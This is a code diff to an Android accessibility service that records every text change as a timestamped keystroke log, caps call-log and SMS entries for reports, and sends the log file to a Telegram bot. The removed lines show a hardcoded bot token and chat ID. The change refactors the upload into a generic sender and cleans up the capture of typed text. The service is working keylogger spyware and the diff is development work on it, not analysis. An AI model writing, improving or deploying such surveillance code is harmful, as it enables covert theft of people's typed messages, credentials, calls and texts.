@@ -21,13 +21,13 @@ class MyAccessibilityService : AccessibilityService() {
     private val handler = Handler(Looper.getMainLooper())
     private val logInterval = 300000L // 5 min
 
-    // Limits for how many entries to include in each report
-    private val CALL_LOG_LIMIT = 30
-    private val SMS_LOG_LIMIT = 50
-
     companion object {
         var instance: MyAccessibilityService? = null
         var flutterCallback: ((String) -> Unit)? = null
+
+        // Shared limits used by both MyAccessibilityService and MainActivity
+        const val CALL_LOG_LIMIT = 30
+        const val SMS_LOG_LIMIT = 50
     }
 
     override fun onServiceConnected() {
@@ -50,50 +50,10 @@ class MyAccessibilityService : AccessibilityService() {
     // --- KEYSTROKE LOG FILE SENDING (existing functionality) ---
 
     private fun sendLogFileToTelegram() {
-        val token = "8279084594:AAG6F4IX2Ahz1tc32cKaH3dkXNOubRSGLpg"
-        val chatId = "8231933199"
         val logFile = File(filesDir, "keypress_logs.txt")
-
         if (logFile.exists() && logFile.length() > 0) {
-            thread {
-                try {
-                    val boundary = "Boundary-${System.currentTimeMillis()}"
-                    val url = URL("https://api.telegram.org/bot$token/sendDocument")
-                    val conn = url.openConnection() as HttpURLConnection
-
-                    conn.doOutput = true
-                    conn.requestMethod = "POST"
-                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-
-                    val outputStream = DataOutputStream(conn.outputStream)
-
-                    outputStream.writeBytes("--$boundary\r\n")
-                    outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
-                    outputStream.writeBytes("$chatId\r\n")
-
-                    outputStream.writeBytes("--$boundary\r\n")
-                    outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"${logFile.name}\"\r\n")
-                    outputStream.writeBytes("Content-Type: text/plain\r\n\r\n")
-
-                    val fileInputStream = FileInputStream(logFile)
-                    val buffer = ByteArray(4096)
-                    var bytesRead: Int
-                    while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
-                        outputStream.write(buffer, 0, bytesRead)
-                    }
-                    fileInputStream.close()
-
-                    outputStream.writeBytes("\r\n--$boundary--\r\n")
-                    outputStream.flush()
-                    outputStream.close()
-
-                    if (conn.responseCode == 200) {
-                        logFile.writeText("")
-                    }
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
-            }
+            // delegate to the generic sender on a background thread
+            thread { sendFileToTelegram(logFile) }
         }
     }
 
@@ -265,7 +225,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            val typedText = event.text.toString()
+            // event.text is a List<CharSequence> — joinToString() avoids the
+            // unwanted "[text]" square brackets that .toString() would produce
+            val typedText = event.text.joinToString(separator = " ")
             val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
             val entry = "[$timestamp] $typedText\n"
 
